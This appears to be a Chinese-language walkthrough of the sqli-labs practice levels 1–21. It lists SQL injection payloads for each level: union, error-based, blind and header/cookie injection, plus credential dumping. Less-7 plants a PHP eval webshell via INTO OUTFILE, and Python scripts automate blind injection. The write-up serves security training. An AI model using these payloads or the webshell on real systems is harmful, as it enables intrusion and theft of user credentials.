# sqli-labs

## Less-1

##### 类型

字符型回显注入`'`

##### 输入点

- 根据添加`'`页面的回显，可以判断出`'`是闭合

![image-20201022190820538](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210419100224.png)

![image-20201022190837113](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210419100225.png)

##### 输出点

- `payload:?id=1' and 1=1--+`

![image-20201022191307023](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210419100226.png)

- `payload:?id=1' and 1=1--+`

  ![image-20201022191415249](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210419100227.png)

  根据二者的回显不同，来判断出输出点

##### 获取数据方式

- 通过union联合查询注入

##### 注入步骤

- 判断列数`payload:?id=1' order by 3--+` 4的时候页面回显报错，所以判断出列数为3列
- 联合查询，判断各列输出的位置`payload:?id=-1' union select 1,2,3--+`
- 获取数据库`payload:?id=-1' union select 1,database(),3--+`
- 爆数据表`payload:?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+`
- 爆users表的数据字段`payload：?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+`
- 在爆出的字段中里面看到了password和username，于是爆数据`?id=-1' union select 1,group_concat(username,'~',password),3 from users--+`username和password中间使用~来分隔

## Less-2

##### 注入类型

数字型注入

##### 输入点/输出点

- 输入`payload:?id=1' and 1=2--+`页面回显报错

- 输入`payload:?id=-1 and 1=2--+`无回显

所以判断这个查询代码使用的是整数。所以就是将后面多余的代码通过--+注释掉就好

##### 获取数据方式

- 通过union联合查询注入

##### 注入步骤

- 判断列数`payload:	` 4的时候页面回显报错，所以判断出列数为3列
- 联合查询，判断各列输出的位置`payload:?id=-1 union select 1,2,3--+`
- 获取数据库`payload:?id=-1 union select 1,database(),3--+`
- 爆数据表`payload:?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+`
- 爆users表的数据字段`payload：?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+`
- 在爆出的字段中里面看到了password和username，于是爆数据`?id=-1 union select 1,group_concat(username,'~',password),3 from users--+`username和password中间使用~来分隔

## Less-3

##### 注入类型

字符型回显注入`')'`

##### 注入点

- 输入`payload:?id=1'--+`页面回显报错![image-20201022202337717](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210419100228.png)

- 根据报错添加')'闭合，输入`payload:?id=1') --+`回显正常

所以判断在后面加`')`来闭合注入

##### 获取数据方式

- 通过union联合查询注入

##### 注入步骤

- 判断列数`payload:	` 4的时候页面回显报错，所以判断出列数为3列
- 联合查询，判断各列输出的位置`payload:?id=-1') union select 1,2,3--+`
- 获取数据库`payload:?id=-1') union select 1,database(),3--+`
- 爆数据表`payload:?id=-1') union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+`
- 爆users表的数据字段`payload：?id=-1') union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+`
- 在爆出的字段中里面看到了password和username，于是爆数据`?id=-1') union select 1,group_concat(username,'~',password),3 from users--+`username和password中间使用~来分隔

## Less-4

##### 注入类型

字符型注入

##### 注入点

- 输入`payload:?id=1"`页面回显报错![image-20201022203218139](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114653.png)

- 根据报错添加')'闭合，输入`payload:?id=1") --+`回显正常

所以判断在后面加`")`来闭合注入

##### 获取数据方式

- 通过`union`联合查询注入

##### 注入步骤

- 判断列数`payload:	` 4的时候页面回显报错，所以判断出列数为3列
- 联合查询，判断各列输出的位置`payload:?id=-1") union select 1,2,3--+`
- 获取数据库`payload:?id=-1") union select 1,database(),3--+`
- 爆数据表`payload:?id=-1") union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+`
- 爆users表的数据字段`payload：?id=-1") union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+`
- 在爆出的字段中里面看到了password和username，于是爆数据`?id=-1") union select 1,group_concat(username,'~',password),3 from users--+`username和password中间使用~来分隔

## Less-5

##### 注入类型

报错注入

##### 注入点

- 输入`payload:?id=1`回显为![image-20201022204407210](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114654.png)
- 输入`payload:?id=1"`回显也为![image-20201022204407210](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114654.png)
- 输入`payload:?id=1'`会回显报错

所以可以通过`'`来使其报错，从而实现报错注入

##### 获取数据方式

- 通过`updatexml`来报错注入查询

##### 注入步骤

- 报错注入不需要判断字段数，所以直接爆数据库名`payload:?id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),1) and '`
- 爆数据表`payload:1' or updatexml(1,concat('~',(select group_concat(table_name)from information_schema.tables where table_schema=database()),'~'),1) or '`
- 爆字段`payload:1' or updatexml(1,concat('~',(select group_concat(column_name)from information_schema.columns where table_name='users'),'~'),1) or '` 右：`id=1' or updatexml(1,right(concat('~',(select group_concat(column_name)from information_schema.columns where table_name='users'),'~'),32),1) or '`
- 爆数据`payload:=1' and updatexml(1, concat(0x7e,(select (group_concat(username,password)) from users),0x7e),1) or '` `payload:id=1' and updatexml(1, right(concat(0x7e,(select (group_concat(username,password)) from users),0x7e),32),1) or '`



## Less-6

##### 注入类型

报错注入

##### 注入点

- 输入`payload:?id=1`回显为![image-20201022204407210](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114654.png)
- 输入`payload:?id=1'`回显也为![image-20201022204407210](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114654.png)
- 输入`payload:?id=1"`会回显报错

所以可以通过`"`来使其报错，从而实现报错注入

##### 获取数据方式

- 通过`extractvalue`来报错注入查询

##### 注入步骤

- 报错注入不需要判断字段数，所以直接爆数据库名`payload:?id=1" or extractvalue(1,concat(0x7e,(select database()),0x7e))%23`
- 爆数据表`payload:id=1" or extractvalue(1,concat('~',(select group_concat(table_name) from information_schema.tables where table_schema=database()),'~'))%23`
- 爆字段`payload:id=1" or extractvalue(1,concat('~',(select group_concat(column_name)from information_schema.columns where table_name='users'),'~'))%23` 右：`id=1" or extractvalue(1,right(concat('~',(select group_concat(column_name)from information_schema.columns where table_name='users'),'~'),32))%23`
- 爆数据`payload:?id=1" and extractvalue(1, concat(0x7e,(select (group_concat(username,password)) from users),0x7e))%23` `payload:?id=1" and extractvalue(1, right(concat(0x7e,(select (group_concat(username,password)) from users),0x7e),32))%23`

## Less-7

##### 注入类型

outfile (文件导入方式注入)

##### 注入点

- 在后面加`'`,`"`都是返回错误![image-20201026124251529](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114655.png)

- 在后面加`'))`回显正常![image-20201026124346668](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114656.png)

  所以可以使用`'))`来闭合它然后自己添加语句

##### 注入方式

文件导入方式注入

##### 注入步骤

使用的环境是phpstudy，需要修改环境里mysql配置文件，my.ini文件

`找到my.ini文件，查找secure_file_priv参数，将前面的分号去掉，如果没有就添加secure_file_priv=""这行`

- 判断字段数：`?id=1')) order by 3--+`
- 注入一句话木马：`?id=1'))UNION SELECT 1,2,'<?php @eval($_post[“mima”])?>' i nto outfile "F:\\PHP\\phpstudy\\phpstudy_2018\\PHPTutorial\\WWW\\sqli\\Less-7\\yijuhua.php"--+` 这里使用2个反斜杠的原因是转义
- 接着使用一句话木马连接就好

## Less-8

##### 注入类型

布尔型盲注

##### 注入点

- 输入`?id=1 and 1=2`，页面虽然没有具体回显，但也没有报错，判断是字符串型注入
- 再输入`?id=1'`，页面没有回显了，再输入`?id=1'#`，页面有回显，说明就是应该就是字符串单引号注入了

所以可以使用`'`来闭合它然后自己添加语句

##### 注入方式

python脚本盲注（布尔型）

- 因为页面没有报错信息，语句错误时没有回显，语句正确时有回显

- 有无回显代表了语句是否错误，说明可以用布尔盲注来进行注入

- ```php
  length()函数：返回字符串str的长度，以字节为单位
  ascii()函数：返回字符串的ascii值
  substr()函数：用来截取数据库某一列字段中的一部分，
  substr(pos,len)表示从pos开始的位置，截取len个字符(空白也算字符)
  limit用法:limit m,n表示从m+1开始取n条
  ```

  

##### 注入步骤

- 爆数据库：`payload：1'and length(database())={}#`判断数据库的长度，正常回显，那么就是数据库长度正常

  `payload：1' and ascii(substr(database(),1,1)) =115 #`判断数据库的第一个字母，回显正常就是正确的，不断尝试。(第一个1代表第几个字母)

- 爆数据表：`payload：1' and ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))<113 #`操作同爆库名一样，需要不断尝试（先使用大于小于来大致判断位置）
- 爆字段：`payload：1' and ascii(substr((select column_name from information_schema.columns  where table_name='表名' limit 0,1),1,1))<113 #`（先使用大于小于来大致判断位置）
- 爆数据：`payload：1' and ascii(substr((select concat(列1,0x3a,列2..) from 表名 limit 0,1),1,1))<113 #`

#### python脚本

```python
import requests
url = "http://localhost/sqli/Less-8/"#url
for i in range(0,10):#具体想判断的数值
    parm = {"id": "1'and length(database())={}#".format(i)}#payload
    req = requests.get(url, params=parm)
    if "You are in..........." in req.text:
        print(i)
        break
```

爆字段

```python
import requests
url = "http://localhost/sqli/Less-8/"#url
for i in range(65,123):#具体想判断的数值
    parm = {"id": "1' and ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))={}#".format(i)}#payload
    req = requests.get(url, params=parm)
    if "You are in..........." in req.text:
        print(i)
        break
```

二分法：

```python
import requests
def result(a,b):
    if (a+b)%2==0:
        return (a+b)/2
    else:
        return (a+b-1)/2
#url
url = "http://localhost/2.sqli/Less-8/"
left=65
mid=94
right=123
while True:
    #payload
    parm = {"id": "1'and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)) > %d #" % mid}
    req = requests.get(url, params=parm)
    if "You are in..........." in req.text:
        left = mid
        mid=result(right,mid)
    else:
        right = mid
        mid=result(left,mid)
    if right == mid or left == mid:
        print(chr(int(right))) if right > left else print(chr(int(left)))
        break
```



## Less-9

##### 注入类型

时间型盲注

##### 注入点

- 无论输入什么东西，页面都只有回显一个页面，所以只能使用时间盲注
- 再输入`?id=1'and sleep(2) --+`，页面延迟了2秒显示

所以可以使用`'`来闭合它然后使用sleep函数来进行时间盲注

##### 注入方式

python脚本盲注（时间型）

- 因为页面永远回显一个页面，所以根据页面刷新的速度来判断输入语句是否正确，以此来获取数

- 时间盲注和布尔盲注差不多，只是判断的依据不同(根据页面刷新的速度)，多了sleep()函数

- ```php
  if表达式：if(expr1,expr2,expr3)
  如果expr1是true(expr1 <> 0 and expr1 <> NULL),则 if()的返回值为expr2; 否则返回值则为 expr3
  sleep(n):让此语句运行n秒钟
  可以通过if表达式和sleep（）函数的应用，通过语句运行时间来判断正确信息
  ```

  

##### 注入步骤

- 爆数据库：`payload：1'and if(length(database())={},sleep(2))#`判断数据库的长度，正常回显，那么就是数据库长度正常

  `payload：1' and if(ascii(substr(database(),1,1))<113,sleep(2),0) #`判断数据库的第一个字母，回显正常就是正确的，不断尝试。(第一个1代表第几个字母)

- 爆数据表：`payload：1' and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))<113,sleep(2),0) #`操作同爆库名一样，需要不断尝试（先使用大于小于来大致判断位置）
- 爆字段：`payload：1' and if(ascii(substr((select column_name from information_schema.columns where table_name='表名' limit 0,1),1,1))<113,sleep(2),0) #`（先使用大于小于来大致判断位置）
- 爆数据：`payload：1' and if(ascii(substr((select concat(列1,0x3a,列2..) from 表名 limit 0,1),1,1))<113,sleep(2),0) #`

## Lsee-10

##### 注入类型

时间型盲注

##### 注入点

- 无论输入什么东西，页面都只有回显一个页面，所以只能使用时间盲注
- 再输入`?id=1'and sleep(2) --+`，页面延迟了2秒显示

所以可以使用`'`来闭合它然后使用sleep函数来进行时间盲注

##### 注入方式

python脚本盲注（时间型）

- 因为页面永远回显一个页面，所以根据页面刷新的速度来判断输入语句是否正确，以此来获取数

- 时间盲注和布尔盲注差不多，只是判断的依据不同(根据页面刷新的速度)，多了sleep()函数

- ```php
  if表达式：if(expr1,expr2,expr3)
  如果expr1是true(expr1 <> 0 and expr1 <> NULL),则 if()的返回值为expr2; 否则返回值则为 expr3
  sleep(n):让此语句运行n秒钟
  可以通过if表达式和sleep（）函数的应用，通过语句运行时间来判断正确信息
  ```

  

##### 注入步骤

- 爆数据库：`payload：1'and if(length(database())={},sleep(2))#`判断数据库的长度，正常回显，那么就是数据库长度正常

  `payload：1' and if(ascii(substr(database(),1,1))<113,sleep(2),0) #`判断数据库的第一个字母，回显正常就是正确的，不断尝试。(第一个1代表第几个字母)

- 爆数据表：`payload：1' and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))<113,sleep(2),0) #`操作同爆库名一样，需要不断尝试（先使用大于小于来大致判断位置）
- 爆字段：`payload：1' and if(ascii(substr((select column_name from information_schema.columns where table_name='表名' limit 0,1),1,1))<113,sleep(2),0) #`（先使用大于小于来大致判断位置）
- 爆数据：`payload：1' and if(ascii(substr((select concat(列1,0x3a,列2..) from 表名 limit 0,1),1,1))<113,sleep(2),0) #`

## less-11

##### 注入类型：

登录框字符串型回显注入

##### 输入点：

输入username：admin'   password：1回显报错

![image-20201109184425826](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114657.png)

##### 输出点：

输入username：admin'#or 1=1(万能密码)   password：1(密码随意)回显正常

![image-20201109184548271](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114658.png)

所以可以在username输入框中使用`’`来闭合语句，再使用union来联合查询

##### 注入方式

union联合查询

##### 注入步骤

- 判断列数`payload:admin' order by 2#` 3的时候页面回显报错，所以判断出列数为3列
- 联合查询，判断各列输出的位置`payload:1admin' union select 1,2#`
- 获取数据库`payload:1admin' union select 1,database()#`
- 爆数据表`payload:1admin' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#`
- 爆users表的数据字段`payload：1admin' union select 1,group_concat(column_name) from information_schema.columns where table_name='users'#`
- 在爆出的字段中里面看到了password和username，于是爆数据`1admin' union select 1,group_concat(username,'~',password) from users#`username和password中间使用~来分隔

## less-12

##### 注入类型：

登录框字符串型回显注入

##### 输入点：

输入`admin"`返回报错，从")得知，对username进行了("username")处理

![image-20201109193901736](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114659.png)

##### 输出点

输入`admin")# or 1=1`回显正常，得知使用`“)`可以闭合前面的语句，从而自己构造语句![image-20201109194336003](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114700.png)

##### 注入方式

采用`")`闭合，再使用union联合查询

##### 注入步骤

- 判断列数`payload:admin") order by 2#` 3的时候页面回显报错，所以判断出列数为3列
- 联合查询，判断各列输出的位置`payload:1admin") union select 1,2#`
- 获取数据库`payload:1admin") union select 1,database()#`
- 爆数据表`payload:1admin") union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#`
- 爆users表的数据字段`payload：1admin") union select 1,group_concat(column_name) from information_schema.columns where table_name='users'#`
- 在爆出的字段中里面看到了password和username，于是爆数据`1admin") union select 1,group_concat(username,'~',password) from users#`username和password中间使用~来分隔

## less-13

##### 注入类型

登录框字符串型无回显注入

##### 输入点：

输入`admin'`  123回显该报错，得知做了`')`处理

![image-20201109194659983](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114701.png)

##### 输出点：

输入`admin')#`  123 无回显，于是得知，可以先使用`')`闭合语句，再使用报错注入来进行SQL注入![image-20201109194844901](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114702.png)

##### 注入方式

使用`')`闭合语句，再使用extractvalue报错注入来进行SQL注入

##### 注入步骤

- 报错注入不需要判断字段数，所以直接爆数据库名`payload:1admin') or extractvalue(1,concat(0x7e,(select database()),0x7e))#`
- 爆数据表`payload:1admin') or extractvalue(1,concat('~',(select group_concat(table_name) from information_schema.tables where table_schema=database()),'~'))#`
- 爆字段`payload:1admin') or extractvalue(1,concat('~',(select group_concat(column_name)from information_schema.columns where table_name='users'),'~'))#` 右：`id=1admin') or extractvalue(1,right(concat('~',(select group_concat(column_name)from information_schema.columns where table_name='users'),'~'),32))#`
- 爆数据`payload:1admin') and extractvalue(1, concat(0x7e,(select (group_concat(username,password)) from users),0x7e))#` `payload:1admin') and extractvalue(1, right(concat(0x7e,(select (group_concat(username,password)) from users),0x7e),32))#`

## less-14

##### 注入类型

登录框字符串型无回显注入

##### 输入点：

输入`admin"`  123回显该报错，得知做了`"`处理

![image-20201109200926216](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114703.png)

##### 输出点：

输入`admin"#`  123 无回显，于是得知，可以先使用`"`闭合语句，再使用报错注入来进行SQL注入![image-20201109194844901](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114702.png)

##### 注入方式

- 通过`updatexml`来报错注入查询

##### 注入步骤

- 报错注入不需要判断字段数，所以直接爆数据库名`payload:1admin" and updatexml(1,concat(0x7e,(select database()),0x7e),1) and "`
- 爆数据表`payload:1admin" or updatexml(1,concat('~',(select group_concat(table_name)from information_schema.tables where table_schema=database()),'~'),1) or "`
- 爆字段`payload:1admin" or updatexml(1,concat('~',(select group_concat(column_name)from information_schema.columns where table_name='users'),'~'),1) or "` 右：`id=1admin" or updatexml(1,right(concat('~',(select group_concat(column_name)from information_schema.columns where table_name='users'),'~'),32),1) or "`
- 爆数据`payload:1admin" and updatexml(1, concat(0x7e,(select (group_concat(username,password)) from users),0x7e),1) or "` `payload:1admin" and updatexml(1, right(concat(0x7e,(select (group_concat(username,password)) from users),0x7e),32),1) or "`

## less-15

##### 注入类型

布尔型盲注

##### 输入点：

![image-20201109201530324](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114704.png)

##### 输出点：

使用`'`闭合构造语句，返回图片为这个。成功与否返回的图片不一样

![image-20201110132051596](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114705.png)

##### 注入方式

使用python脚本来进行布尔盲注

##### 注入步骤

- 爆数据库长度：`passwd=1&submit=Submit&uname=1'or length(database())=8 #`判断数据库的长度，有回显，就说明数据库名正确
- 爆数据库名：`passwd=1&submit=Submit&uname=1' or ascii(substr(database(),1,1)) =115 #`爆数据库名的第一个字母。将右边的1改为2,3，等即为判断第2，第3个字母
- 爆表：`passwd=1&submit=Submit&uname=' or ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))<113`
- 爆列：`passwd=1&submit=Submit&uname=' or ascii(substr((select column_name from information_schema.columns where table_name='表名' limit 0,1),1,1))<113#`
- 爆数据：`passwd=1&submit=Submit&uname=' or ascii(substr((select concat(列1,0x3a,列2..) from 表名 limit 0,1),1,1))<113#`

#### python脚本（布尔型）

```python
import requests
from bs4 import BeautifulSoup
def result(a,b):#二分法
    if (a+b)%2==0:
        return (a+b)/2
    else:
        return (a+b-1)/2
url = "http://localhost/sqli/Less-15/"#url
left=65
mid=94
right=123
while True:
    #payload
    data = {"passwd":"1","submit":"Submit","uname":"passwd=1&submit=Submit&uname=1' or ascii(substr(database(),1,1)) >%d #"%mid}
    req = requests.post(url, data=data)#采用post方式提交
    #获取图片的路径
    bs = BeautifulSoup(req.text,"lxml")
    da=bs.select('img')
    if da[0]['src'] =='../images/flag.jpg':#根据图片的src名字来判断
        left = mid	#二分法
        mid=result(right,mid)
    else:		#二分法
        right = mid
        mid=result(left,mid)
    if right == mid or left == mid:
        print(chr(int(right))) if right > left else print(chr(int(left)))
        break
```



## less-16

##### 注入类型

##### 注入点

##### 注入方式

##### 注入步骤

- 爆数据库长度：`passwd=1&submit=Submit&uname=1admin" or length(database())=8 #`判断数据库的长度，有回显，就说明数据库名正确
- 爆数据库名：`passwd=1&submit=Submit&uname=1admin" or ascii(substr(database(),1,1)) =115 #`爆数据库名的第一个字母。将右边的1改为2,3，等即为判断第2，第3个字母
- 爆表：`passwd=1&submit=Submit&uname=1admin" or ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))<113`
- 爆列：`passwd=1&submit=Submit&uname=1admin" or ascii(substr((select column_name from information_schema.columns where table_name='表名' limit 0,1),1,1))<113#`
- 爆数据：`passwd=1&submit=Submit&uname=1admin" or ascii(substr((select concat(列1,0x3a,列2..) from 表名 limit 0,1),1,1))<113#`

#### python时间盲注脚本

```python
import requests
import time
import datetime

url = "http://127.0.0.1/sqli/Less-16/"

def get_dbname():
    db_name = ''
    for i in range(1,9):
        for k in range(32,127):
            database_payload = {'uname':'1admin") and if(ascii(substr(database(),%d,1))=%d,sleep(2),1)#'%(i,k),'passwd':'1'}
            time1 = datetime.datetime.now()
            res = requests.post(url,database_payload)
            time2 = datetime.datetime.now()
            difference = (time2-time1).seconds
            if difference > 1:
                db_name += chr(k)
                print("数据库名为->"+db_name)
get_dbname()

def get_table():
    table1 = ''
    table2 = ''
    table3 = ''
    table4 = ''
    for i in range(5):
        for j in range(6):
            for k in range(32,127):
                table_payload = {"uname":'1admin") and if(ascii(substr((select table_name from information_schema.tables where table_schema=\'security\' limit %d,1),%d,1))=%d,sleep(2),1)#'%(i,j,k),"passwd":"1"}
                time1 = datetime.datetime.now()
                res = requests.post(url,table_payload)
                time2 = datetime.datetime.now()
                difference = (time2-time1).seconds
                if difference > 1:
                    if i == 0:
                        table1 += chr(k)
                        print("第一张表名为->"+table1)
                    if i == 1:
                        table2 += chr(k)
                        print("第二张表名为->"+table2)
                    if i == 2:
                        table3 += chr(k)
                        print("第三张表名为->"+table3)
                    if i == 3:
                        table4 += chr(k)
                        print("第四张表名为->"+table4)
                    else:
                        continue
get_table()

def get_column():
    column1 = ''
    column2 = ''
    column3 = ''
    column4 = ''
    for i in range(5):
        for j in range(6):
            for k in range(32,127):
                column_payload = {"uname":'1admin") and if(ascii(substr((select column_name from information_schema.columns where table_name=\'flag\' limit %d,1),%d,1))=%d,sleep(2),1)#'%(i,j,k),"passwd":"1"}
                time1 = datetime.datetime.now()
                res = requests.post(url,column_payload)
                time2 = datetime.datetime.now()
                difference = (time2-time1).seconds
                if difference > 1:
                    if i == 0:
                        column1 += chr(k)
                        print("第一个字段名为->"+column1)
                    if i == 1:
                        column2 += chr(k)
                        print("第二个字段名为->"+column2)
                    if i == 2:
                        column3 += chr(k)
                        print("第三个字段名为->"+column3)
                    if i == 3:
                        column4 += chr(k)
                        print("第四个字段名为->"+column4)
                    else:
                        continue
get_column()

def get_flag():
    flag = ''
    for i in range(30):
        for k in range(32,127):
            flag_payload = {"uname":'1admin") and if(ascii(substr((select flag from flag),%d,1))=%d,sleep(2),1)#'%(i,k),"passwd":"1"}
            time1 = datetime.datetime.now()
            res = requests.post(url,flag_payload)
            time2 = datetime.datetime.now()
            difference = (time2-time1).seconds
            if difference > 1:
                flag += chr(k)
                print("flag为->"+flag)
            else:
                continue
get_flag()
```



## less-17

##### 注入类型

update字符型报错注入

##### 输入点：

updata修改密码输入 `admin`     `123'` 回显如下。所在输入点在new password

![image-20201110164512920](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114706.png)

##### 输出点：

输入`admin`  `123'#` 无回显。所以可以通过加`'`来闭合前面的语句，再自己构造新的语句来注入。

![image-20201110164637870](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114707.png)

##### 注入方式

以为会回显报错信息，所以可以使用extractvalue报错注入来进行SQL注入

##### 注入步骤

- 报错注入不需要判断字段数，所以直接爆数据库名`payload:123' and extractvalue(1,concat(0x7e,(select database()),0x7e))#`
- 爆数据表`payload:123' and extractvalue(1,concat('~',(select group_concat(table_name) from information_schema.tables where table_schema=database()),'~'))#`
- 爆字段`payload:123' and extractvalue(1,concat('~',(select group_concat(column_name)from information_schema.columns where table_name='users'),'~'))#` 右：`id=123' and extractvalue(1,right(concat('~',(select group_concat(column_name)from information_schema.columns where table_name='users'),'~'),32))#`
- 爆数据`payload:123' and extractvalue(1, concat(0x7e,(select (group_concat(username,password)) from users),0x7e))#` `payload:123' and extractvalue(1, right(concat(0x7e,(select (group_concat(username,password)) from users),0x7e),32))#`

## less-18

##### 注入类型

http头部注入

##### 输入点：

经过尝试发现在user-agent中传入值会有回显(用户名和密码都是要正确的才行，admin/admin)

![image-20201112150208590](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114708.png)

##### 输出点：

使用BP工具修改其user-agent的值为`aaa`传入，页面回显如下。所以可以判断后台语句有插入user-agent于是在user-agent中使用报错注入。

![image-20201112150537578](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114709.png)

##### 注入方式：

再user-agent中使用报错注入

##### 注入步骤

- 报错注入不需要判断字段数，所以直接爆数据库名`payload:?1' and updatexml(1,concat(0x7e,(select database()),0x7e),1) and '`
- 爆数据表`payload:' and updatexml(1,concat('~',(select group_concat(table_name)from information_schema.tables where table_schema=database()),'~'),1) and '1'=1'`
- 爆字段`payload:1' and updatexml(1,concat('~',(select group_concat(column_name)from information_schema.columns where table_name='users'),'~'),1) and '` 右：`1' and updatexml(1,right(concat('~',(select group_concat(column_name)from information_schema.columns where table_name='users'),'~'),32),1) and '`
- 爆数据`payload:1' and updatexml(1, concat(0x7e,(select (group_concat(username,password)) from users),0x7e),1) and '` `payload:1' and updatexml(1, right(concat(0x7e,(select (group_concat(username,password)) from users),0x7e),32),1) and '`

## less-19

##### 注入类型

referfer部分注入

##### 输入点：

经过尝试发现在referfer中传入值会有回显(用户名和密码都是要正确的才行，admin/admin)

![image-20201112151218738](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114710.png)

##### 输出点：

使用BP工具修改其referfer的值为`aaa`传入，页面回显如下。所以可以判断后台语句有插入referfer于是在referfer中使用报错注入。

![image-20201112151250569](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114711.png)

##### 注入步骤

- 报错注入不需要判断字段数，所以直接爆数据库名`payload:?admin' and extractvalue(1,concat(0x7e,(select database()),0x7e)) and '`
- 爆数据表`payload:admin' and extractvalue(1,concat('~',(select group_concat(table_name) from information_schema.tables where table_schema=database()),'~'))and '`
- 爆字段`payload:1' and extractvalue(1,concat('~',(select group_concat(column_name)from information_schema.columns where table_name='users'),'~'))and '` 右：`1' or extractvalue(1,right(concat('~',(select group_concat(column_name)from information_schema.columns where table_name='users'),'~'),32))and '`
- 爆数据`payload:1' and extractvalue(1, concat(0x7e,(select (group_concat(username,password)) from users),0x7e))%23` `payload:?1' and extractvalue(1, right(concat(0x7e,(select (group_concat(username,password)) from users),0x7e),32))and '`

## less-20

##### 注入类型

cookie部分注入

##### 输入点：

采用damin登录后，发现cookie会获取username的值再传入。刷新页面，会重新获取cookie于是可以趁机修改。

![image-20201113151726212](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114712.png)

##### 输出点：

在BP包中将cookie：username=admin改为username=AAA。发现页面也的`YOUR COOKIE : uname =`也会修改。于是就可以在这里进行报错注入。单引号闭合，爆三个显示为，所以是单引号闭合![image-20201113153451096](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114713.png)

![image-20201113151829502](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114714.png)

##### 注入方式

通过它会cookie的值这个特性来修改cookie来使用报错语句进行sql注入

##### 注入步骤

- 报错注入不需要判断字段数，所以直接爆数据库名`payload:?admin' and extractvalue(1,concat(0x7e,(select database()),0x7e)) #`
- 爆数据表`payload:admin' and extractvalue(1,concat('~',(select group_concat(table_name) from information_schema.tables where table_schema=database()),'~'))#`
- 爆字段`payload:1' and extractvalue(1,concat('~',(select group_concat(column_name)from information_schema.columns where table_name='users'),'~'))#` 右：`1' or extractvalue(1,right(concat('~',(select group_concat(column_name)from information_schema.columns where table_name='users'),'~'),32))#`
- 爆数据`payload:1' and extractvalue(1, concat(0x7e,(select (group_concat(username,password)) from users),0x7e))%23` `payload:?1' and extractvalue(1, right(concat(0x7e,(select (group_concat(username,password)) from users),0x7e),32))#`

## less-21

##### 注入类型

cookie部分注入(base64)加密

##### 输入点

采用damin登录后，发现cookie会获取username的值再传入。刷新页面，会重新获取cookie于是可以趁机修改，但是这个cookie是经过加密过后的。

![image-20201113154324761](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114715.png)

##### 输出点：

在BP包中将cookie：username=admin改为username=AAA。发现页面也的`YOUR COOKIE : uname =`也会修改。于是就可以在这里进行报错注入。传入`AAA'`，爆错如下，所以是对username做了('')处理。所以使用`')`来闭合它![image-20201113154501262](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114716.png)

![image-20201113154658288](https://cdn.jsdelivr.net/gh/chenzh66/Typort_private/img/20210411114717.png)

##### 注入方式

通过它会cookie的值这个特性来修改cookie来使用报错语句进行sql注入（需要对报错语句进行base64加密）

##### 注入步骤

- 报错注入不需要判断字段数，所以直接爆数据库名`payload:YWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBkYXRhYmFzZSgpKSwweDdlKSkgIw==`
- 爆数据表`payload:YWRtaW4nIGFuZCBleHRyYWN0dmFsdWUoMSxjb25jYXQoJ34nLChzZWxlY3QgZ3JvdXBfY29uY2F0KHRhYmxlX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyB3aGVyZSB0YWJsZV9zY2hlbWE9ZGF0YWJhc2UoKSksJ34nKSkj`
